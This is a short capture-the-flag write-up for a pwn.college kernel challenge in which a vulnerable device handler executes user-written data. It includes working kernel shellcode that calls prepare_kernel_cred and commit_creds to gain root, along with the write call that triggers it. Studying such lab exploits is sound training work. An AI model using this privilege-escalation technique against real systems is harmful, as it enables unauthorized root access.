#metadata(
  (
    title: "Kernel Level 6",
    description: "Writeup for Kernel Level 6",
    date: "2026-01-01",
    order: 6,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project



#table(
  columns: (auto, 1fr),
  inset: 10pt,
  align: (right, left),
  [*Title*], [Kernel Shellcode Execution via Write],
  [*Date*], [2025-12-30],
  [*Description*],
  [Executing arbitrary code in kernel space by writing shellcode to a device handler that subsequently executes it.],
)

= Babykernel Level 6

== Introduction

This challenge escalates from triggering pre-defined functions to executing arbitrary shellcode in kernel context.

== Vulnerability Analysis

The kernel module provides a `device_write` handler that copies user-provided data into a kernel buffer and then executes that buffer. This is a direct "Write-then-Execute" vulnerability in the kernel.

== Exploitation Steps

=== 1. Preparing Kernel Shellcode
The shellcode should perform the privilege elevation logic by calling `prepare_kernel_cred(0)` and then `commit_creds(result)`.

```nasm
xor rdi, rdi
mov rax, 0xffffffff81089660 ; prepare_kernel_cred
call rax
mov rdi, rax
mov rax, 0xffffffff81089310 ; commit_creds
call rax
ret
```

=== 2. Writing to the Device
By writing this shellcode to `/proc/pwncollege`, the kernel module's write handler is triggered, copying and executing our code.

```c
write(fd, shellcode, sizeof(shellcode));
```

=== 3. Root Shell
After the write returns, the process is root and can spawn a shell.

